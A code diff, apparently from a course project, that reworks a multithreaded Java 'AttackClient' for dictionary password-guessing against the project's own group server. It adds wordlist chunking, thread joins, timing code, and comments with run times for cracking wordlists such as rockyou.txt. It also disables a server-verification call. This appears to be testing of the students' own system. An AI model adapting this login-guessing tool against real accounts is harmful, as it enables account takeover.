@@ -11,6 +11,7 @@ import java.util.Base64;
 import java.util.Scanner;
 import java.util.Arrays;
 
+import java.time.OffsetDateTime;
 
 // Crypto libraries
 import org.bouncycastle.*;
@@ -30,7 +31,7 @@ import javax.crypto.Cipher;
 public class AttackClient {
 
 	public static void main(String[] args) {
-		// Usage | AttackClient <IP> <PORT> <MODULE> <USERNAME> <?LOWER?> <?UPPER?>
+		// Usage | AttackClient <IP> <PORT> <USERNAME> <list>
 		AttackClient ac = new AttackClient();
 
 		if (args.length < 4) {
@@ -39,38 +40,87 @@ public class AttackClient {
 		} else {
 			String ip = args[0];
 			int port = Integer.parseInt(args[1]);
-			String module = args[2];
-			String username = args[3];
+			String username = args[2];
+			String list = args[3];
 			int lower = 0; 
 			int upper = 0;
             AttackClientThread thread = null;
 
-			if (module.toLowerCase().equals("brute")) {
-				lower = Integer.parseInt(args[4]);
-				upper = Integer.parseInt(args[5]);
+            OffsetDateTime start = OffsetDateTime.now();
 
-				//perform bruteforce
-			} else if (module.toLowerCase().equals("dict")) {
-				try {
-					File dictionary = new File("top1000000.txt");
-					Scanner dictRead = new Scanner(dictionary);
-					String[] pwStore = new String[1000000];
-					int i = 0;
-					while (dictRead.hasNextLine()) {
-						String pw = dictRead.nextLine();
-						pwStore[i]=pw;
-						if (i%10000==0 && i!=0) {
-							thread = new AttackClientThread(ip, port, username, Arrays.copyOfRange(pwStore, i-10000, i));
-							System.out.println("Trying "+i+" passwords");
-                			thread.start();
-						}
-						i++;
-					}
-				} catch (Exception e) {
-					System.out.println(e);
+			try {
+				File dictionary = new File(list);
+				Scanner dictRead = new Scanner(dictionary);
+
+				int i = 0;
+				while (dictRead.hasNextLine()) {
+					String tem=dictRead.nextLine();
+					i++;
 				}
-				
+				dictRead.close();
+
+				dictRead = new Scanner(dictionary);
+				String[] pwStore = new String[i+1];
+				ArrayList<AttackClientThread> arrThreads=new ArrayList<AttackClientThread>();
+
+				int z=0; int ct=0;
+				while (dictRead.hasNextLine()) {
+					String pw = dictRead.nextLine();
+					pwStore[z]=pw;
+					if (z%(i/1000)==0 && z!=0) {
+						ct++;
+						thread = new AttackClientThread(ip, port, username, Arrays.copyOfRange(pwStore, z-(i/1000), z));
+						System.out.println("Trying "+z+" passwords");
+            			thread.start();
+            			arrThreads.add(thread);
+					}
+					z++;
+				}
+
+				for (int t = 0; t<arrThreads.size(); t++) {
+					arrThreads.get(t).join();
+				}
+					// System.out.println(ct);
+					// System.out.println(i);
+			} catch (Exception e) {
+				System.out.println(e);
 			}
+
+			OffsetDateTime end = OffsetDateTime.now();
+
+			System.out.println("STARTED AT: \t"+start);
+			System.out.println("ENDED AT:   \t"+end);
+
+			// cain.txt - 3MB
+			// STARTED AT:     2020-11-17T20:13:10.026-05:00
+			// ENDED AT:       2020-11-17T20:21:04.171-05:00
+			// Total:		   7 minutes	54 seconds
+
+			// john.txt - 21.4KB
+			// STARTED AT:     2020-11-17T20:21:23.337-05:00
+			// ENDED AT:       2020-11-17T20:24:07.937-05:00
+			// Total:		   2 minutes	44 seconds
+
+			// PasswordPro.txt - 29.5MB
+			// STARTED AT:     2020-11-17T20:37:49.740-05:00
+			// ENDED AT:       2020-11-17T20:40:25.049-05:00
+			// Total:		   2 minutes	36 seconds
+
+			// phpbb.txt - 1.5MB
+			// STARTED AT:     2020-11-17T21:17:47.020-05:00
+			// ENDED AT:       2020-11-17T21:22:25.276-05:00
+			// Total:		   4 minutes	38 seconds
+
+			// rockyou.txt - 133MB
+			// STARTED AT:     2020-11-17T20:40:43.088-05:00
+			// ENDED AT:       2020-11-17T20:46:35.414-05:00
+			// Total:		   5 minutes	52 seconds
+
+			// top1000000.txt - 8.13MB
+			// STARTED AT:     2020-11-17T20:47:39.354-05:00
+			// ENDED AT:       2020-11-17T21:12:15.360-05:00
+			// Total:		   24 minutes	36 seconds
+			
 		}
 
 	}
@@ -118,8 +168,8 @@ class AttackClientThread extends Thread{
 			if(i%1000==0&&i!=0)
 				System.out.println(Thread.currentThread().getId()+" | Done "+i);
 		}
+		System.out.println(Thread.currentThread().getId()+" | Finished");
 		mapCommand(new StringTokenizer("exit"));
-		System.out.println("Done");
     }
 
     public AttackClientThread(boolean _gui) {
@@ -158,7 +208,7 @@ class AttackClientThread extends Thread{
             case "GROUP":
                 g_cli.connect(server, port);
                 // TODO: Change username
-                g_cli.verifyServer("GROUP");
+                // g_cli.verifyServer("GROUP");
                 break;            
             case "FILE":
                 f_cli.connect(server, port);
@@ -232,10 +282,10 @@ class AttackClientThread extends Thread{
 
     private boolean getToken(StringTokenizer args) {
         if (args.countTokens() != 2) {
-            System.out.println("Usage: GET <USERNAME> <PASSWORD>");
+            // System.out.println("Usage: GET <USERNAME> <PASSWORD>");
             return false;
         } else if (!g_cli.isConnected()) {
-            System.out.println("Group server is not connected");
+            // System.out.println("Group server is not connected");
             return false;
         }
 
